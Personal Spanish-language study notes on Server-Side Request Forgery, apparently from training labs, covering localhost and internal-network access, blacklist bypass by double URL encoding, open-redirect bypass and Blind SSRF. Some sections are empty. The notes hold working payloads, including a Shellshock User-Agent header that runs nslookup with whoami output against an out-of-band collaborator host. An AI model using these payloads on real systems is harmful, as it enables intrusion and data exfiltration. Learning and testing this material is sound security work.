Tipos de SSRF:
* acceso al local server
* acceso a otra backend que se encuentra en el segmento de red
* bypassear un filtro de blacklist
* bypassear un filtro de open redirect
* Blind SSRF


1. Acceso a local server:
	1.  tengo un endpoint en particular (generalmente un POST) y cambio al request tratando de acceder a un recurso de administracion, asi como localhost/admin
	2. si la app no tiene filtro y el recurso existe dentro del host pues ya puedo ejecutar comandos

![[Pasted image 20230830135032.png]]


2. Acceso a otro backend
	1. usando el intruder hago un escaneo si alguien tiene en escucha un endpoint tipo localhost/admin
	2. copio la ip y trato de accederla:

Enviando el request al Intruder, seteando un payload en el ultimo octeto de la IP y haciendo un ataque de numeros del 1 al 255:

![[Pasted image 20230831134825.png]]

![[Pasted image 20230831134852.png]]

![[Pasted image 20230831135000.png]]


![[Pasted image 20230831135409.png]]

![[Pasted image 20230831135421.png]]

....

![[Pasted image 20230831135439.png]]

actualizando el payload:

![[Pasted image 20230831135509.png]]


3. Blacklist bypass: Tecnicas claves: 1) tratar de bypasear primer el localhost y luego el endpoint, 2) si el endpoint esta filtrado usar la tecnica de Double URL Encoding mas la primera letra del nombre: "admin" -> "%2561dmin"
	1. probar si el localhost es alcanzable:

![[Pasted image 20230911140654.png]]

![[Pasted image 20230911140722.png]]


* Probando bypasear el localhost

![[Pasted image 20230911140750.png]]

![[Pasted image 20230911141231.png]]

* Probando con el endpoint admin:

![[Pasted image 20230911141259.png]]

* Encodear el endpoint admin:

![[Pasted image 20230911141524.png]]

![[Pasted image 20230911141513.png]]



![[Pasted image 20230911141630.png]]


* Si encodeo incluso toda la cadena siempre obtengo el error, por tanto, la tecnica a usar se sugiere que sea la de Double URL Encoding el cual es poner al inicio del endpoint el caracter %25 y encodear la primera letra, luego queda a criterio encodear el resto del nombre del endpoint:

![[Pasted image 20230911142153.png]]

![[Pasted image 20230911142235.png]]

* Borrar la cuenta de carlos:


![[Pasted image 20230911142326.png]]


4. Bypassear filtrado usando un open redirection
	1. Aunque la aplicacion tenga un filtrado de direcciones o endpoints pero si es vulnerable a una redireccion puede lograrse acceso a un endpoint en particular:
	2. ejemplo: /product/nextProduct?currentProductId=6&path=http://evil-user.net
	3. si redirige a evil-user.net es que se logra generar el SSRF
	4. entonces el payload puede ser asi: stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
	
===============
5.  Blind SSRF
================
	
 1. Este es el tipo de SSRF mas complejo de explotar, normalmente no parecen tener tanto impacto como las anteriores categorias pero su potencial es que en ocasiones puede lograrse RCE
	2. Se recomienda intentar con tecnicas de Out of Band (OAST) con la intencion de lograr control sobre un host que permita interactuar con la red interna
	3. Ojo con la siguiente afirmacion:
	

![[Pasted image 20230914142555.png]]

4. Creo que se llama Blind SSRF porque no puede verse la respuesta del BackEnd, aca una explicacion:


![[Pasted image 20230914142851.png]]


7. Este es un muy buen recurso para leer sobre tecnica de explotacion: https://d0pt3x.gitbook.io/passion/webapp-security/server-side-request-forgery/exploiting-blind-ssrf


=============================
6. Blind SSRF con shellshock exploit
==============================

![[Pasted image 20230920135645.png]]

   * shellshock sólo existe en sistemas operativos basados en Unix
   * Payload shellshock: CVE-2014-6271:  $ env X='() { :; }; echo "pwned"' bash -c :
   * en el caso del lab el payload fue:  User-Agent: () { :; }; /usr/bin/nslookup $(whoami).g6n6dl0qo73jlw2n8y8hgx6l8ce22r.oastify.com
   * luego en el referer trato de hacer un hit a una de las IP dentro de la red y para ello uso un intruder con ataque de numero y eso genera un hit en el burp collaborator y ahi obtengo data exfiltration

=================================
7. Bypassing whitelist filtering
================================




8.  SSRF prevention techniques propuestas por el OWASP: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
9. payloads de SSRF: https://hacktricks.boitatech.com.br/pentesting-web/ssrf-server-side-request-forgery
10. patyloads para SSRF: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-localhost-with-a-domain-redirection
11. 